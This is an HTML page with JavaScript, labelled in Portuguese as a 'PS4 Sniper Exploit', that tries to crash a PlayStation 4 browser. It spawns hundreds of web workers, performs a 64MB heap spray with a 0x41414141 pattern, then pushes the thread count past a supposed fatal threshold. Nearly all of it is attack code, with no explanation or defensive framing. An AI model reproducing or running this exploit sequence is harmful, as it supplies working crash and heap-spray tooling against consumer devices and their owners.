<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Sniper Exploit (Lite )</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #status { font-size: 24px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        #counter { font-size: 80px; font-weight: bold; color: #333; }
        .log { color: #888; font-size: 14px; margin-top: 10px; height: 300px; overflow-y: auto; }
        button { font-size: 24px; padding: 15px 30px; cursor: pointer; background: #900; color: #fff; border: 2px solid #f00; width: 100%; }
    </style>
</head>
<body>

    <div id="status">AGUARDANDO INÍCIO...</div>
    <div id="counter">0</div>
    <div id="log" class="log"></div>
    
    <button onclick="runExploitSequence()">INICIAR SEQUÊNCIA (SPRAY 64MB)</button>

    <script>
        // --- CONFIGURAÇÃO REFINADA ---
        const TARGET_ZONE = 415; // Ponto de parada (Seguro antes do 418)
        const FATAL_PUSH = 430;  // Empurra até o crash
        
        // REDUZIDO: De 300 para 64 blocos de 1MB.
        // Isso evita o erro "Out of Memory" do navegador.
        const SPRAY_LIMIT_MB = 64; 
        const SPRAY_PATTERN = 0x41414141; 
        
        let count = 0;
        let sprayStore = [];

        // Worker (Trigger do Crash)
        const workerCode = `
            function deep(n) {
                const v = new Float64Array(128);
                if (n > 0) deep(n-1);
            }
            deep(10); 
            postMessage("Done");
        `;
        const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}<br>` + el.innerHTML;
        }

        function setStatus(msg, color="#0f0") {
            const el = document.getElementById('status');
            el.innerText = msg;
            el.style.color = color;
        }

        function spawnThread() {
            new Worker(url).onmessage = () => {};
            count++;
            document.getElementById('counter').innerText = count;
        }

        function runExploitSequence() {
            setStatus("FASE 1: Enchendo Threads...", "#ff0");
            sprayStore = []; // Limpa memória anterior
            
            let fastInterval = setInterval(() => {
                // Sobe rápido até 350
                if(count < 350) {
                    for(let i=0; i<5; i++) spawnThread();
                } 
                // Vai devagar até 415
                else if(count < TARGET_ZONE) {
                    spawnThread();
                } 
                // PAUSA EM 415
                else {
                    clearInterval(fastInterval);
                    performHeapSpray();
                }
            }, 50); 
        }

        function performHeapSpray() {
            setStatus(`FASE 2: INJETANDO ${SPRAY_LIMIT_MB}MB...`, "#0ff");
            document.body.style.backgroundColor = "#001133"; 
            
            setTimeout(() => {
                try {
                    // Tenta alocar 64MB em blocos de 1MB
                    for (let i = 0; i < SPRAY_LIMIT_MB; i++) {
                        let buffer = new ArrayBuffer(1024 * 1024); // 1MB
                        let view = new Uint32Array(buffer);
                        // Preenche apenas o início e fim para ser mais rápido
                        // e economizar CPU, mas ainda aloca a página inteira.
                        for (let k = 0; k < 256; k++) view[k] = SPRAY_PATTERN;
                        
                        sprayStore.push(view);
                    }
                    log(`Sucesso: ${SPRAY_LIMIT_MB}MB alocados.`);
                    setTimeout(triggerFatalCrash, 500);
                    
                } catch (e) {
                    log("Aviso: Memória cheia durante o spray (" + e.message + ").");
                    log("Continuando para o crash com o que temos...");
                    setTimeout(triggerFatalCrash, 500);
                }
            }, 200);
        }

        function triggerFatalCrash() {
            setStatus("FASE 3: DETONANDO (415 -> " + FATAL_PUSH + ")", "#f00");
            document.body.style.backgroundColor = "#300"; 
            document.getElementById('counter').style.color = "#fff";

            let deathInterval = setInterval(() => {
                spawnThread();
                
                // Se passar muito do ponto fatal (418/419)
                if(count >= FATAL_PUSH) {
                    clearInterval(deathInterval);
                    setStatus("FALHA? Console sobreviveu.", "#fff");
                    log("O Spray pode ter estabilizado a memória.");
                }
            }, 1000); // Bem lento: 1 thread por segundo
        }
    </script>
</body>
</html>

